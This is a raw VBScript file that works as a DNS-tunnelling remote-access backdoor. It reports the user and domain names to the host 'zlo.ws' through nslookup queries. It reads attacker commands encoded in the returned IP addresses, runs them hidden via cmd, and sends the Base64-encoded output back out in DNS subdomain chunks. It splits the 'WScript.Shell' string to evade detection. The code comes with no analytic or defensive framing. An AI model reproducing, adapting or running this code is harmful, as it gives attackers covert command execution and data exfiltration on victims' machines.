DOMAIN="zlo.ws" ' domain put here!!
DOMAIN=DOMAIN&"."
GtUIn="WScr"&"ipt.Shell"
Set WShell = WScript.CreateObject(GtUIn)
uName = WShell.ExpandEnvironmentStrings("%USERNAME%")
uDomain = WShell.ExpandEnvironmentStrings("%USERDOMAIN%")
TEMP = WShell.ExpandEnvironmentStrings("%TEMP%")
ZLOBA="Script"&"ing.FileSystemObject"
Set fahudss    = CreateObject(ZLOBA)
ZLOBER= TEMP & "\asdRthbdsiu.txt"
Dim cmd(11)
Function Base64Encode(inData)
Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
Dim cOut, sOut, I
For I = 1 To Len(inData) Step 3
Dim nGroup, pOut, sGroup
nGroup = &H10000 * Asc(Mid(inData, I, 1)) + &H100 * MyASC(Mid(inData, I + 1, 1)) + MyASC(Mid(inData, I + 2, 1))
nGroup = Oct(nGroup)
nGroup = String(8 - Len(nGroup), "0") & nGroup
pOut = Mid(Base64, CLng("&o" & Mid(nGroup, 1, 2)) + 1, 1) + _
Mid(Base64, CLng("&o" & Mid(nGroup, 3, 2)) + 1, 1) + _
Mid(Base64, CLng("&o" & Mid(nGroup, 5, 2)) + 1, 1) + _
Mid(Base64, CLng("&o" & Mid(nGroup, 7, 2)) + 1, 1)
sOut = sOut + pOut
Next
Select Case Len(inData) Mod 3
Case 1:
sOut = Left(sOut, Len(sOut) - 2) + "=="
Case 2:
sOut = Left(sOut, Len(sOut) - 1) + "="
End Select
Base64Encode = sOut
End Function
Function MyASC(OneChar)
If OneChar = "" Then MyASC = 0 Else MyASC = Asc(OneChar)
End Function
function nslookup(input,time)
WShell.Run "cmd /c nslookup "& input &" > """&ZLOBER&""" 2>&1",0,true
WScript.Sleep time
if(time>3000)then
Set objFile = fahudss.OpenTextFile(ZLOBER, 1)
strData = objFile.ReadAll
Set objRegExpz = New RegExp
objRegExpz.IgnoreCase = False
objRegExpz.Global = True
objRegExpz.Pattern = "\d+\.\d+\.\d+\.\d+"
Set myMatchez = objRegExpz.Execute(strData)
startC=0
command=""
If myMatchez.Count > 0 Then
	For i = 0 To myMatchez.Count-1
		If myMatchez(i).Value="1.1.1.1" Then
			startC=1
			For z = 1 To myMatchez.Count-1
				If myMatchez(z).Value<>"1.1.1.1" Then
					bytez=Split(myMatchez(z).Value,".")
					idx=bytez(0)
					for x=1 to 3
						if bytez(x)<>"0" then
							cmd(idx)=cmd(idx)&chr(bytez(x))
						end if
					next
				end if
			next
		End If
	next
If startC=1 then
	for each cp in cmd
		command=command&cp
	next
	erase cmd
end if
End If
nslookup=command
else
nslookup=""
end if
end 	function
request="XR.["&uName&"]["&uDomain&"]."&DOMAIN
nslookup request,0
WScript.Sleep 200
loopVar=1
Do While loopVar=1
request="XG.["&uName&"]["&uDomain&"]."&DOMAIN
command=nslookup(request,5000)
If  command="sleep" then
WScript.Sleep 30000
Elseif command="exit" then
request="XE.["&uName&"]["&uDomain&"]."&DOMAIN
nslookup request,0
loopVar=0
Elseif command<>"" then
Str=""
WShell.Run "cmd /c "&command&" > """&ZLOBER&""" 2>&1",0,true
Set objFile = fahudss.OpenTextFile(ZLOBER, 1)
Str = objFile.ReadAll
BStr=Base64Encode(Str)
leng=Len(BStr)
partz=Int(leng/50)
f=0
if partz>0 then
For q=0 to partz-1 
f=q+1
part=mid(BStr,(q*50)+1,50)
request="XX."&CStr(q)&"."&part&"."&DOMAIN
nslookup request,0
next
end if
part=mid(BStr,(f*50)+1,leng-(f*50))
request="XX.FI."&part&"."&DOMAIN
nslookup request,0
end if
Loop
